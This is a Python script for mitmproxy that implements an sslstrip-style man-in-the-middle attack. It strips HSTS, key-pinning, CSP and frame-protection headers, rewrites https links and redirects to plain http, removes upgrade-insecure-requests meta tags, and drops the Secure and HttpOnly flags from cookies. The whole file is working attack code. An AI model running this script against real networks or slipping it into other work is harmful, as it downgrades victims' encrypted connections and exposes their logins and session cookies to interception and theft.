"""
This script implements an sslstrip-like attack based on mitmproxy.
https://moxie.org/software/sslstrip/
"""
import re
import urllib

# set of SSL/TLS capable hosts
secure_hosts = set()


def request(flow):
    flow.request.headers.pop('If-Modified-Since', None)
    flow.request.headers.pop('Cache-Control', None)

    # do not force https redirection
    flow.request.headers.pop('Upgrade-Insecure-Requests', None)

    # proxy connections to SSL-enabled hosts
    if bytes(flow.request.pretty_host,'utf-8') in secure_hosts:
        flow.request.scheme = 'https'
        flow.request.port = 443

        # We need to update the request destination to whatever is specified in the host header:
        # Having no TLS Server Name Indication from the client and just an IP address as request.host
        # in transparent mode, TLS server name certificate validation would fail.
        flow.request.host = flow.request.pretty_host


def response(flow):
    flow.response.headers.pop('Strict-Transport-Security', None)
    flow.response.headers.pop('Public-Key-Pins', None)
    
    #strip all secure headers
    flow.response.headers.pop('Content-Security-Policy', None)
    flow.response.headers.pop('X-XSS-Protection', None)
    flow.response.headers.pop('X-Frame-Options', None)

    # strip meta tag upgrade-insecure-requests in response body
    csp_meta_tag_pattern = b'<meta.*http-equiv=["\']Content-Security-Policy[\'"].*upgrade-insecure-requests.*?>'
    flow.response.content = re.sub(csp_meta_tag_pattern, b'', flow.response.content, flags=re.IGNORECASE)

    #Parse all https link and add hostname to secure_host set
    secure_hosts.update([urllib.parse.urlparse(link).hostname for link in re.findall(b'https://[^\s"\']+', flow.response.content)])

    #strip links in response body
    flow.response.content = flow.response.content.replace(b'https://', b'http://')

    #strip port 443 to 80
    flow.response.content = flow.response.content.replace(b':443', b'')

    #strip links in 'Location' header
    if flow.response.headers.get('Location', '').startswith('https://'):
        location = flow.response.headers['Location']
        hostname = urllib.parse.urlparse(location).hostname
        if hostname:
            secure_hosts.add(hostname)
        flow.response.headers['Location'] = location.replace('https://', 'http://', 1)

    #strip secure flag from 'Set-Cookie' headers
    cookies = flow.response.headers.get_all('Set-Cookie')
    cookies = [re.sub(r';\s*secure\s*', '', s) for s in cookies]
    #strip httponly flag from 'Set-Cookie' headers
    cookies = [re.sub(r';\s*HttpOnly\s*', '', s) for s in cookies]
    flow.response.headers.set_all('Set-Cookie', cookies)  
